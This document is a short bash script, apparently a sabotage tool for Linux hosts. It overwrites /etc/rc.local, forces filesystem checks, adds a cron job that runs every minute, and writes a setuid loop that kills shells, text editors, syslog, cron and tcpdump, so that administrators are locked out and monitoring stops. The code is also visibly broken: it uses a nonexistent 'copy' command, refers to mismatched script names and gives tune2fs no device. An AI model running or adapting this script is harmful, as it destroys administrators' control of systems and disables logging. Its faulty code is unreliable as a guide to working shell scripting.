#!/bin/bash -p

echo "/usr/local/bin/lintroll.sh; exit 0" > /etc/rc.local
touch /forcefsck
chmod 000 /forcefsck
tune2fs -c 1

echo "*/1 * * * * root /usr/local/bin/lintroll.sh" >> /etc/crontab

copy /bin/bash /bin/com

echo "#!/bin/com -p" >/usr/local/bin/lintroller.sh
echo "while [ 1 ]; do" >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"bash\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"sh\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"dash\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"vi\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"vim\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"nano\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"syslog\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"cron\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"tail\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"more\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"less\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "kill -9 `ps aux | grep \"tcpdump\" | awk {' print $2 '}`"  >> /usr/local/bin/lintroller.sh
echo "done" >> /usr/local/bin/lintroller.sh

chmod a+sx /usr/local/bin/lintroller.sh

/usr/local/bin/lintroller.sh
